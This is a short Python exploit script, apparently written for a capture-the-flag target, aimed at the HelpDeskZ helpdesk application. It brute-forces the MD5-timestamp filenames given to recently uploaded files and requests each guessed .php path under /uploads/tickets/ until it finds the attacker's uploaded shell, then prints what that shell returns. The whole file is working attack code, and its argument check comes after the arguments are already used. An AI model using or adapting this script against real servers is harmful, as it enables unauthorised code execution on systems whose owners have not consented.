#!/usr/bin/python3

import requests
from datetime import datetime
import hashlib
import time
import sys

url = sys.argv[1]
file = sys.argv[2]

if len(sys.argv)!=3:
	print("usage: python3 {} <baseURL e.g. http://10.10.10.10/helpdeskz> <uploadedFileName>")

#print Unix timestamp in GMT
time2 = int(time.time())

#make hashed filename for r seconds
for r in range(0, 300):
	tmp =  file + str(time2 - r)
	print(tmp)
	h = hashlib.md5(tmp.encode()).hexdigest() 
	filename = h + ".php"

#bruteforce valid path
	print(filename)
	r = requests.get(url+"/uploads/tickets/" + filename)
	if r.status_code != 404:
		print(filename)
		print(r.text)
		exit()
